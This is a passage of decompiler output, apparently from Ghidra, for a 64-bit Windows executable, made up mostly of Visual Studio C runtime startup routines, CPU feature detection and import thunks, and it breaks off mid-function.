      uVar9 = (ulonglong)*puVar8;
      uVar7 = FUN_1400067f0(uVar9);
      iVar3 = (int)uVar7;
      bVar2 = FUN_14000bf38();
      if (bVar2) {
        if (!bVar1) {
          _cexit();
        }
        __scrt_uninitialize_crt(CONCAT71((int7)(uVar9 >> 8),1),'\0');
        return uVar7 & 0xffffffff;
      }
      goto LAB_14000bb58;
    }
  }
  FUN_14000bf28(7);
LAB_14000bb58:
                    /* WARNING: Subroutine does not return */
  exit(iVar3);
}


// ==== entry @ 14000bb68 size 18

void entry(void)

{
  FUN_14000be08();
  FUN_14000b9ec();
  return;
}


// ==== FUN_14000bb7c @ 14000bb7c size 8

void FUN_14000bb7c(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)swi(0x29);
  (*pcVar1)(2);
  return;
}


// ==== FUN_14000bb84 @ 14000bb84 size 33

undefined8 * FUN_14000bb84(undefined8 *param_1)

{
  param_1[2] = 0;
  param_1[1] = "bad allocation";
  *param_1 = std::bad_alloc::vftable;
  return param_1;
}


// ==== FUN_14000bba8 @ 14000bba8 size 31

void FUN_14000bba8(void)

{
  undefined8 local_28 [5];
  
  FUN_14000bb84(local_28);
                    /* WARNING: Subroutine does not return */
  _CxxThrowException(local_28,(ThrowInfo *)&DAT_14000f428);
}


// ==== __scrt_acquire_startup_lock @ 14000bbc8 size 57

/* Library Function - Single Match
    __scrt_acquire_startup_lock
   
   Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release */

ulonglong __scrt_acquire_startup_lock(void)

{
  bool bVar1;
  undefined7 extraout_var;
  ulonglong uVar2;
  
  bVar1 = __scrt_is_ucrt_dll_in_use();
  uVar2 = CONCAT71(extraout_var,bVar1);
  if ((int)uVar2 == 0) {
LAB_14000bbf6:
    uVar2 = uVar2 & 0xffffffffffffff00;
  }
  else {
    do {
      uVar2 = 0;
      LOCK();
      bVar1 = DAT_140010138 == 0;
      if (bVar1) {
        DAT_140010138 = *(ulonglong *)((longlong)Self + 8);
      }
      else {
        uVar2 = DAT_140010138;
      }
      UNLOCK();
      if (bVar1) goto LAB_14000bbf6;
    } while (*(ulonglong *)((longlong)Self + 8) != uVar2);
    uVar2 = CONCAT71((int7)(uVar2 >> 8),1);
  }
  return uVar2;
}


// ==== FUN_14000bc04 @ 14000bc04 size 58

longlong FUN_14000bc04(int param_1)

{
  char cVar1;
  uint7 extraout_var;
  uint7 uVar2;
  undefined7 extraout_var_00;
  uint7 extraout_var_01;
  
  if (param_1 == 0) {
    DAT_140010140 = 1;
  }
  FUN_14000c070();
  cVar1 = FUN_14000bedc();
  uVar2 = extraout_var;
  if (cVar1 != '\0') {
    cVar1 = FUN_14000bedc();
    if (cVar1 != '\0') {
      return CONCAT71(extraout_var_00,1);
    }
    FUN_14000bedc();
    uVar2 = extraout_var_01;
  }
  return (ulonglong)uVar2 << 8;
}


// ==== __scrt_initialize_onexit_tables @ 14000bc40 size 139

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    __scrt_initialize_onexit_tables
   
   Library: Visual Studio 2019 Release */

undefined8 __scrt_initialize_onexit_tables(uint param_1)

{
  code *pcVar1;
  bool bVar2;
  ulonglong in_RAX;
  undefined7 extraout_var;
  undefined8 uVar3;
  
  if (DAT_140010141 == '\0') {
    if (1 < param_1) {
      FUN_14000bf28(5);
      pcVar1 = (code *)swi(3);
      uVar3 = (*pcVar1)();
      return uVar3;
    }
    bVar2 = __scrt_is_ucrt_dll_in_use();
    if (((int)CONCAT71(extraout_var,bVar2) == 0) || (param_1 != 0)) {
      in_RAX = 0xffffffffffffffff;
      DAT_140010148 = _DAT_14000e2c0;
      uRam0000000140010150 = _UNK_14000e2c8;
      _DAT_140010158 = 0xffffffffffffffff;
      _DAT_140010160 = _DAT_14000e2c0;
      uRam0000000140010168 = _UNK_14000e2c8;
      _DAT_140010170 = 0xffffffffffffffff;
    }
    else {
      in_RAX = _initialize_onexit_table(&DAT_140010148);
      if (((int)in_RAX != 0) ||
         (in_RAX = _initialize_onexit_table(&DAT_140010160), (int)in_RAX != 0)) {
        return in_RAX & 0xffffffffffffff00;
      }
    }
    DAT_140010141 = '\x01';
  }
  return CONCAT71((int7)(in_RAX >> 8),1);
}


// ==== FUN_14000bccc @ 14000bccc size 150

ulonglong FUN_14000bccc(longlong param_1)

{
  word *pwVar1;
  ulonglong uVar2;
  uint7 uVar3;
  longlong lVar4;
  word *pwVar5;
  
  uVar2 = 0x5a4d;
  if (IMAGE_DOS_HEADER_140000000.e_magic == (char  [2])0x5a4d) {
    lVar4 = (longlong)(int)IMAGE_DOS_HEADER_140000000.e_lfanew;
    if ((*(int *)(IMAGE_DOS_HEADER_140000000.e_magic + lVar4) == 0x4550) &&
       (uVar2 = 0x20b,
       *(short *)((longlong)IMAGE_DOS_HEADER_140000000.e_res_4_ + lVar4 + -4) == 0x20b)) {
      pwVar5 = (word *)(IMAGE_DOS_HEADER_140000000.e_magic + lVar4 +
                       (ulonglong)
                       *(ushort *)((longlong)IMAGE_DOS_HEADER_140000000.e_res_4_ + lVar4 + -8) +
                       0x18);
      uVar2 = (ulonglong)*(ushort *)(IMAGE_DOS_HEADER_140000000.e_magic + lVar4 + 6);
      pwVar1 = pwVar5 + uVar2 * 0x14;
      for (; pwVar5 != pwVar1; pwVar5 = pwVar5 + 0x14) {
        if (((ulonglong)*(uint *)(pwVar5 + 6) <= param_1 - 0x140000000U) &&
           (uVar2 = (ulonglong)(*(int *)(pwVar5 + 4) + *(uint *)(pwVar5 + 6)),
           param_1 - 0x140000000U < uVar2)) goto LAB_14000bd42;
      }
      pwVar5 = (word *)0x0;
LAB_14000bd42:
      if (pwVar5 == (word *)0x0) {
        return uVar2 & 0xffffffffffffff00;
      }
      uVar3 = (uint7)(uVar2 >> 8);
      if (*(int *)(pwVar5 + 0x12) < 0) {
        return (ulonglong)uVar3 << 8;
      }
      return CONCAT71(uVar3,1);
    }
  }
  return uVar2 & 0xffffffffffffff00;
}


// ==== __scrt_release_startup_lock @ 14000bd64 size 36

/* Library Function - Single Match
    __scrt_release_startup_lock
   
   Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release */

void __scrt_release_startup_lock(char param_1)

{
  bool bVar1;
  undefined3 extraout_var;
  
  bVar1 = __scrt_is_ucrt_dll_in_use();
  if ((CONCAT31(extraout_var,bVar1) != 0) && (param_1 == '\0')) {
    LOCK();
    DAT_140010138 = 0;
    UNLOCK();
  }
  return;
}


// ==== __scrt_uninitialize_crt @ 14000bd88 size 41

/* Library Function - Single Match
    __scrt_uninitialize_crt
   
   Library: Visual Studio 2019 Release */

undefined1 __scrt_uninitialize_crt(undefined8 param_1,char param_2)

{
  if ((DAT_140010140 == '\0') || (param_2 == '\0')) {
    FUN_14000bedc();
    FUN_14000bedc();
  }
  return 1;
}


// ==== _onexit @ 14000bdb4 size 58

/* Library Function - Single Match
    _onexit
   
   Library: Visual Studio 2019 Release */

_onexit_t __cdecl _onexit(_onexit_t _Func)

{
  int iVar1;
  _onexit_t p_Var2;
  
  if (DAT_140010148 == -1) {
    iVar1 = _crt_atexit();
  }
  else {
    iVar1 = _register_onexit_function(&DAT_140010148);
  }
  p_Var2 = (_onexit_t)0x0;
  if (iVar1 == 0) {
    p_Var2 = _Func;
  }
  return p_Var2;
}


// ==== atexit @ 14000bdf0 size 23

/* Library Function - Single Match
    atexit
   
   Library: Visual Studio 2019 Release */

int __cdecl atexit(_func_5014 *param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = _onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}


// ==== FUN_14000be08 @ 14000be08 size 175

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14000be08(void)

{
  DWORD DVar1;
  _FILETIME local_res8;
  LARGE_INTEGER local_res10;
  _FILETIME local_18 [2];
  
  if (DAT_140010000 == 0x2b992ddfa232) {
    local_res8.dwLowDateTime = 0;
    local_res8.dwHighDateTime = 0;
    GetSystemTimeAsFileTime(&local_res8);
    local_18[0] = local_res8;
    DVar1 = GetCurrentThreadId();
    local_18[0] = (_FILETIME)((ulonglong)local_18[0] ^ (ulonglong)DVar1);
    DVar1 = GetCurrentProcessId();
    local_18[0] = (_FILETIME)((ulonglong)local_18[0] ^ (ulonglong)DVar1);
    QueryPerformanceCounter(&local_res10);
    DAT_140010000 =
         ((ulonglong)local_res10.s.LowPart << 0x20 ^
          CONCAT44(local_res10.s.HighPart,local_res10.s.LowPart) ^ (ulonglong)local_18[0] ^
         (ulonglong)local_18) & 0xffffffffffff;
    if (DAT_140010000 == 0x2b992ddfa232) {
      DAT_140010000 = 0x2b992ddfa233;
    }
  }
  _DAT_140010040 = ~DAT_140010000;
  return;
}


// ==== FUN_14000beb8 @ 14000beb8 size 3

undefined8 FUN_14000beb8(void)

{
  return 0;
}


// ==== FUN_14000bebc @ 14000bebc size 6

undefined8 FUN_14000bebc(void)

{
  return 1;
}


// ==== FUN_14000bec4 @ 14000bec4 size 6

undefined8 FUN_14000bec4(void)

{
  return 0x4000;
}


// ==== FUN_14000becc @ 14000becc size 14

void FUN_14000becc(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000bed3. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  InitializeSListHead(&DAT_140010180);
  return;
}


// ==== FUN_14000bedc @ 14000bedc size 3

undefined1 FUN_14000bedc(void)

{
  return 1;
}


// ==== FUN_14000bee0 @ 14000bee0 size 8

undefined * FUN_14000bee0(void)

{
  return &DAT_140010190;
}


// ==== FUN_14000bee8 @ 14000bee8 size 8

undefined * FUN_14000bee8(void)

{
  return &DAT_140010198;
}


// ==== FUN_14000bef0 @ 14000bef0 size 27

void FUN_14000bef0(void)

{
  ulonglong *puVar1;
  
  puVar1 = (ulonglong *)FUN_14000bee0();
  *puVar1 = *puVar1 | 0x24;
  puVar1 = (ulonglong *)FUN_14000bee8();
  *puVar1 = *puVar1 | 2;
  return;
}


// ==== FUN_14000bf0c @ 14000bf0c size 12

bool FUN_14000bf0c(void)

{
  return DAT_14001004c == 0;
}


// ==== FUN_14000bf18 @ 14000bf18 size 8

undefined * FUN_14000bf18(void)

{
  return &DAT_1400103d8;
}


// ==== FUN_14000bf20 @ 14000bf20 size 8

undefined * FUN_14000bf20(void)

{
  return &DAT_1400103d0;
}


// ==== FUN_14000bf28 @ 14000bf28 size 5

void FUN_14000bf28(undefined4 param_1)

{
  code *pcVar1;
  
  pcVar1 = (code *)swi(0x29);
  (*pcVar1)(param_1);
  return;
}


// ==== thunk_FUN_14000beb8 @ 14000bf30 size 5

undefined8 thunk_FUN_14000beb8(void)

{
  return 0;
}


// ==== FUN_14000bf38 @ 14000bf38 size 82

bool FUN_14000bf38(void)

{
  HMODULE pHVar1;
  longlong lVar2;
  bool bVar3;
  
  pHVar1 = GetModuleHandleW((LPCWSTR)0x0);
  if ((((pHVar1 == (HMODULE)0x0) || ((short)pHVar1->unused != 0x5a4d)) ||
      (lVar2 = (longlong)pHVar1[0xf].unused, *(int *)((longlong)&pHVar1->unused + lVar2) != 0x4550))
     || ((*(short *)((longlong)&pHVar1[6].unused + lVar2) != 0x20b ||
         (*(uint *)((longlong)&pHVar1[0x21].unused + lVar2) < 0xf)))) {
    bVar3 = false;
  }
  else {
    bVar3 = *(int *)((longlong)&pHVar1[0x3e].unused + lVar2) != 0;
  }
  return bVar3;
}


// ==== FUN_14000bf8c @ 14000bf8c size 14

void FUN_14000bf8c(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000bf93. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  SetUnhandledExceptionFilter(FUN_14000bf9c);
  return;
}


// ==== FUN_14000bf9c @ 14000bf9c size 90

undefined8 FUN_14000bf9c(undefined8 *param_1)

{
  int *piVar1;
  undefined8 uVar2;
  undefined8 *puVar3;
  
  piVar1 = (int *)*param_1;
  if ((*piVar1 == -0x1f928c9d) && (piVar1[6] == 4)) {
    if ((piVar1[8] + 0xe66cfae0U < 3) || (piVar1[8] == 0x1994000)) {
      puVar3 = (undefined8 *)__current_exception();
      *puVar3 = piVar1;
      uVar2 = param_1[1];
      puVar3 = (undefined8 *)__current_exception_context();
      *puVar3 = uVar2;
                    /* WARNING: Subroutine does not return */
      terminate();
    }
  }
  return 0;
}


// ==== FUN_14000bff8 @ 14000bff8 size 60

void FUN_14000bff8(void)

{
  longlong *plVar1;
  
  for (plVar1 = &DAT_14000ec80; plVar1 < &DAT_14000ec80; plVar1 = plVar1 + 1) {
    if (*plVar1 != 0) {
      (*(code *)PTR__guard_dispatch_icall_14000e1c0)();
    }
  }
  return;
}


// ==== FUN_14000c034 @ 14000c034 size 60

void FUN_14000c034(void)

{
  longlong *plVar1;
  
  for (plVar1 = &DAT_14000ec90; plVar1 < &DAT_14000ec90; plVar1 = plVar1 + 1) {
    if (*plVar1 != 0) {
      (*(code *)PTR__guard_dispatch_icall_14000e1c0)();
    }
  }
  return;
}


// ==== FUN_14000c070 @ 14000c070 size 667

/* WARNING: Removing unreachable block (ram,0x00014000c15b) */
/* WARNING: Removing unreachable block (ram,0x00014000c14b) */
/* WARNING: Removing unreachable block (ram,0x00014000c126) */
/* WARNING: Removing unreachable block (ram,0x00014000c0aa) */
/* WARNING: Removing unreachable block (ram,0x00014000c088) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_14000c070(void)

{
  int *piVar1;
  uint *puVar2;
  int *piVar3;
  longlong lVar4;
  uint uVar5;
  byte bVar6;
  ulonglong uVar7;
  uint uVar8;
  ulonglong uVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  ulonglong in_XCR0;
  
  piVar1 = (int *)cpuid_basic_info(0);
  puVar2 = (uint *)cpuid_Version_info(1);
  uVar5 = puVar2[3];
  if ((piVar1[2] == 0x49656e69 && piVar1[3] == 0x6c65746e) && piVar1[1] == 0x756e6547) {
    uVar8 = *puVar2 & 0xfff3ff0;
    _DAT_140010058 = 0x8000;
    _DAT_140010060 = 0xffffffffffffffff;
    if ((((uVar8 == 0x106c0) || (uVar8 == 0x20660)) || (uVar8 == 0x20670)) ||
       ((uVar8 - 0x30650 < 0x21 &&
        ((0x100010001U >> ((ulonglong)(uVar8 - 0x30650) & 0x3f) & 1) != 0)))) {
      DAT_1400101a4 = DAT_1400101a4 | 1;
    }
  }
  uVar11 = 0;
  uVar8 = 0;
  if (*piVar1 < 7) {
    uVar12 = 0;
    uVar10 = 0;
  }
  else {
    piVar3 = (int *)cpuid_Extended_Feature_Enumeration_info(7);
    uVar12 = piVar3[1];
    uVar10 = piVar3[2];
    if ((uVar12 >> 9 & 1) != 0) {
      DAT_1400101a4 = DAT_1400101a4 | 2;
    }
    if (0 < *piVar3) {
      lVar4 = cpuid_Extended_Feature_Enumeration_info(7);
      uVar11 = *(uint *)(lVar4 + 8);
    }
    if (0x23 < *piVar1) {
      lVar4 = cpuid(0x24);
      uVar8 = *(uint *)(lVar4 + 4);
    }
  }
  _DAT_140010050 = 1;
  DAT_140010054 = 2;
  uVar9 = DAT_140010068 & 0xfffffffffffffffe;
  if ((uVar5 >> 0x14 & 1) != 0) {
    _DAT_140010050 = 2;
    DAT_140010054 = 6;
    uVar9 = DAT_140010068 & 0xffffffffffffffee;
  }
  DAT_140010068 = uVar9;
  if ((uVar5 >> 0x1b & 1) == 0) {
    return 0;
  }
  uVar9 = xinuse(0);
  uVar9 = in_XCR0 & uVar9 & 0xffffffff;
  if (((uVar5 >> 0x1c & 1) == 0) || (bVar6 = (byte)uVar9, (bVar6 & 6) != 6)) goto LAB_14000c2d8;
  _DAT_140010050 = 3;
  uVar5 = DAT_140010054 | 8;
  uVar7 = DAT_140010068;
  if ((uVar12 & 0x20) == 0) {
LAB_14000c26a:
    DAT_140010068 = uVar7;
    DAT_140010054 = uVar5;
    uVar5 = DAT_140010054;
    uVar7 = DAT_140010068;
  }
  else {
    _DAT_140010050 = 5;
    uVar5 = DAT_140010054 | 0x28;
    uVar7 = DAT_140010068 & 0xfffffffffffffffd;
    if ((uVar12 & 0xd0030000) == 0xd0030000) {
      if ((bVar6 & 0xe0) != 0xe0) goto LAB_14000c26a;
      DAT_140010054 = DAT_140010054 | 0x68;
      _DAT_140010050 = 6;
      uVar5 = DAT_140010054;
      uVar7 = DAT_140010068 & 0xffffffffffffffd9;
    }
  }
  DAT_140010068 = uVar7;
  DAT_140010054 = uVar5;
  if ((uVar10 >> 0x17 & 1) != 0) {
    DAT_140010068 = DAT_140010068 & 0xfffffffffeffffff;
  }
  if (((uVar11 >> 0x13 & 1) != 0) && ((bVar6 & 0xe0) == 0xe0)) {
    _DAT_1400101a8 = uVar8 & 0x400ff;
    DAT_140010068 = DAT_140010068 & ~((ulonglong)(uVar8 >> 0x10 & 6) | 0x1000029);
    if (1 < (byte)_DAT_1400101a8) {
      DAT_140010068 = DAT_140010068 & 0xffffffffffffffbf;
    }
  }
LAB_14000c2d8:
  if (((uVar11 >> 0x15 & 1) != 0) && ((uVar9 >> 0x13 & 1) != 0)) {
    DAT_140010068 = DAT_140010068 & 0xffffffffffffff7f;
  }
  return 0;
}


// ==== __scrt_is_ucrt_dll_in_use @ 14000c30c size 12

/* Library Function - Single Match
    __scrt_is_ucrt_dll_in_use
   
   Library: Visual Studio 2019 Release */

bool __scrt_is_ucrt_dll_in_use(void)

{
  return DAT_140010070 != 0;
}


// ==== __CxxFrameHandler4 @ 14000c320 size 6

void __CxxFrameHandler4(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c320. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __CxxFrameHandler4();
  return;
}


// ==== _CxxThrowException @ 14000c332 size 6

void __stdcall _CxxThrowException(void *pExceptionObject,ThrowInfo *pThrowInfo)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c332. Too many branches */
                    /* WARNING: Subroutine does not return */
                    /* WARNING: Treating indirect jump as call */
  _CxxThrowException(pExceptionObject,pThrowInfo);
  return;
}


// ==== __current_exception @ 14000c338 size 6

void __current_exception(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c338. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __current_exception();
  return;
}


// ==== __current_exception_context @ 14000c33e size 6

void __current_exception_context(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c33e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __current_exception_context();
  return;
}


// ==== memset @ 14000c344 size 6

void * __cdecl memset(void *_Dst,int _Val,size_t _Size)

{
  void *pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00014000c344. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = memset(_Dst,_Val,_Size);
  return pvVar1;
}


// ==== _callnewh @ 14000c34a size 6

int __cdecl _callnewh(size_t _Size)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00014000c34a. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = _callnewh(_Size);
  return iVar1;
}


// ==== malloc @ 14000c350 size 6

void * __cdecl malloc(size_t _Size)

{
  void *pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00014000c350. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = malloc(_Size);
  return pvVar1;
}


// ==== free @ 14000c356 size 6

void __cdecl free(void *_Memory)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c356. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  free(_Memory);
  return;
}


// ==== _seh_filter_exe @ 14000c35c size 6

void _seh_filter_exe(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c35c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _seh_filter_exe();
  return;
}


// ==== _set_app_type @ 14000c362 size 6

void _set_app_type(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c362. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _set_app_type();
  return;
}


// ==== __setusermatherr @ 14000c368 size 6

void __setusermatherr(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c368. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __setusermatherr();
  return;
}


// ==== _configure_narrow_argv @ 14000c36e size 6

void _configure_narrow_argv(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c36e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _configure_narrow_argv();
  return;
}


// ==== _initialize_narrow_environment @ 14000c374 size 6

void _initialize_narrow_environment(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c374. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _initialize_narrow_environment();
  return;
}


// ==== _get_initial_narrow_environment @ 14000c37a size 6

void _get_initial_narrow_environment(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c37a. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _get_initial_narrow_environment();
  return;
}


// ==== _initterm @ 14000c380 size 6

void _initterm(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c380. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _initterm();
  return;
}


// ==== _initterm_e @ 14000c386 size 6

void _initterm_e(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c386. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _initterm_e();
  return;
}


// ==== exit @ 14000c38c size 6

void __cdecl exit(int _Code)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c38c. Too many branches */
                    /* WARNING: Subroutine does not return */
                    /* WARNING: Treating indirect jump as call */
  exit(_Code);
  return;
}


// ==== _exit @ 14000c392 size 6

void __cdecl _exit(int _Code)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c392. Too many branches */
                    /* WARNING: Subroutine does not return */
                    /* WARNING: Treating indirect jump as call */
  _exit(_Code);
  return;
}


// ==== _set_fmode @ 14000c398 size 6

errno_t __cdecl _set_fmode(int _Mode)

{
  errno_t eVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00014000c398. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  eVar1 = _set_fmode(_Mode);
  return eVar1;
}


// ==== __p___argc @ 14000c39e size 6

void __p___argc(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c39e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __p___argc();
  return;
}


// ==== __p___argv @ 14000c3a4 size 6

void __p___argv(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c3a4. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __p___argv();
  return;
}


// ==== _cexit @ 14000c3aa size 6

void __cdecl _cexit(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c3aa. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _cexit();
  return;
}


// ==== _register_thread_local_exe_atexit_callback @ 14000c3b6 size 6

void _register_thread_local_exe_atexit_callback(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c3b6. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _register_thread_local_exe_atexit_callback();
  return;
}


// ==== _configthreadlocale @ 14000c3bc size 6

int __cdecl _configthreadlocale(int _Flag)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00014000c3bc. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = _configthreadlocale(_Flag);
  return iVar1;
}


// ==== _set_new_mode @ 14000c3c2 size 6

void _set_new_mode(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c3c2. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _set_new_mode();
  return;
}


// ==== __p__commode @ 14000c3c8 size 6

void __p__commode(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c3c8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __p__commode();
  return;
}


// ==== _initialize_onexit_table @ 14000c3ce size 6

void _initialize_onexit_table(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c3ce. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _initialize_onexit_table();
  return;
}


// ==== _register_onexit_function @ 14000c3d4 size 6

void _register_onexit_function(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c3d4. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _register_onexit_function();
  return;
}


// ==== _crt_atexit @ 14000c3da size 6

void _crt_atexit(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c3da. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _crt_atexit();
  return;
}


// ==== terminate @ 14000c3e0 size 6

void terminate(void)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c3e0. Too many branches */
                    /* WARNING: Subroutine does not return */
                    /* WARNING: Treating indirect jump as call */
  terminate();
  return;
}


// ==== FUN_14000c3e8 @ 14000c3e8 size 29

undefined8 FUN_14000c3e8(undefined8 param_1,longlong param_2,undefined8 param_3,longlong param_4)

{
  FUN_14000c408(param_2,param_4);
  return 1;
}


// ==== FUN_14000c408 @ 14000c408 size 99

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_14000c408(longlong param_1,longlong param_2)

{
  ulonglong uVar1;
  
  uVar1 = (ulonglong)*(uint *)(*(longlong *)(param_2 + 0x10) + 8);
  if ((*(byte *)(uVar1 + 3 + *(longlong *)(param_2 + 8)) & 0xf) != 0) {
    param_1 = ((ulonglong)*(byte *)(uVar1 + 3 + *(longlong *)(param_2 + 8)) & 0xfffffff0) + param_1;
  }
  return param_1;
}


// ==== FUN_14000c46c @ 14000c46c size 127

void FUN_14000c46c(longlong param_1,longlong param_2,undefined8 param_3,longlong param_4)

{
  longlong lVar1;
  
  lVar1 = *(longlong *)(param_4 + 0x38);
  FUN_14000c408(param_2,param_4);
  if ((*(uint *)(lVar1 + 4) & ((*(uint *)(param_1 + 4) & 0x66) != 0) + 1) != 0) {
    __CxxFrameHandler4(param_1,param_2,param_3,param_4);
  }
  return;
}


// ==== memcpy @ 14000c4eb size 6

void * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00014000c4eb. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = memcpy(_Dst,_Src,_Size);
  return pvVar1;
}


// ==== memmove @ 14000c4f1 size 6

void * __cdecl memmove(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00014000c4f1. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = memmove(_Dst,_Src,_Size);
  return pvVar1;
}


// ==== _guard_dispatch_icall @ 14000c510 size 2

/* WARNING: This is an inlined function */

void _guard_dispatch_icall(void)

{
  code *UNRECOVERED_JUMPTABLE;
  
                    /* WARNING: Could not recover jumptable at 0x00014000c510. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*UNRECOVERED_JUMPTABLE)();
  return;
}


// ==== _guard_dispatch_icall @ 14000c530 size 6

/* WARNING: This is an inlined function */

void _guard_dispatch_icall(void)

{
  (*(code *)PTR__guard_dispatch_icall_14000e1c0)();
  return;
}


// ==== FUN_14000c540 @ 14000c540 size 38

void FUN_14000c540(undefined8 param_1,longlong param_2)

{
  if ((*(uint *)(param_2 + 0x70) & 1) != 0) {
    *(uint *)(param_2 + 0x70) = *(uint *)(param_2 + 0x70) & 0xfffffffe;
    FUN_1400037d0(*(longlong **)(param_2 + 0x78));
  }
  return;
}


// ==== FUN_14000c57c @ 14000c57c size 29

void FUN_14000c57c(undefined8 *param_1)

{
  _seh_filter_exe(*(undefined4 *)*param_1,param_1);
  return;
}


// ==== FUN_14000c59a @ 14000c59a size 23

bool FUN_14000c59a(undefined8 *param_1)

{
  return *(int *)*param_1 == -0x3ffffffb;
}


// ==== FUN_14000d000 @ 14000d000 size 644

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong *
FUN_14000d000(longlong *param_1,undefined8 *param_2,longlong *param_3,void *param_4,
             undefined2 *param_5,uint *param_6)

{
  longlong *plVar1;
  uint uVar2;
  uint uVar3;
  undefined1 *puVar4;
  void *pvVar5;
  undefined8 *puVar6;
  uint *puVar7;
  undefined1 *puVar8;
  ulonglong uVar9;
  ulonglong uVar10;
  undefined1 auStack_98 [32];
  undefined1 local_78 [8];
  undefined4 local_70;
  undefined2 *local_68;
  longlong *local_60;
  undefined8 *local_58;
  ulonglong local_50;
  
  local_50 = DAT_140010000 ^ (ulonglong)auStack_98;
  local_68 = param_5;
  local_70 = 0;
  plVar1 = param_2 + 0x40;
  puVar4 = (undefined1 *)param_2[0x41];
  local_60 = param_1;
  if (puVar4 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar4,(undefined1 *)((longlong)param_2 + 0x1b));
  }
  else {
    *puVar4 = *(undefined1 *)((longlong)param_2 + 0x1b);
    param_2[0x41] = param_2[0x41] + 1;
  }
  FUN_1400061e0(param_2,*param_3);
  FUN_140003ea0(*param_3);
  if ((void *)*param_3 != (void *)0x0) {
    FUN_140006700((void *)*param_3);
  }
  FUN_140006440(param_1);
  local_70 = 1;
  puVar6 = (undefined8 *)FUN_14000b890(0x4d0);
  local_58 = puVar6;
  memset(puVar6,0,0x4d0);
  puVar6 = FUN_140003810(puVar6);
  *param_3 = (longlong)puVar6;
  *param_5 = 0;
  FUN_1400022c0((longlong)param_4,0xffff);
  FUN_1400022c0((longlong)param_6,0x10);
  puVar4 = (undefined1 *)*plVar1;
  puVar8 = (undefined1 *)param_2[0x41];
  if (puVar4 != puVar8) {
    param_2[0x41] = puVar4;
    puVar8 = puVar4;
  }
  if (puVar8 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar8,(undefined1 *)param_2);
  }
  else {
    *puVar8 = *(undefined1 *)param_2;
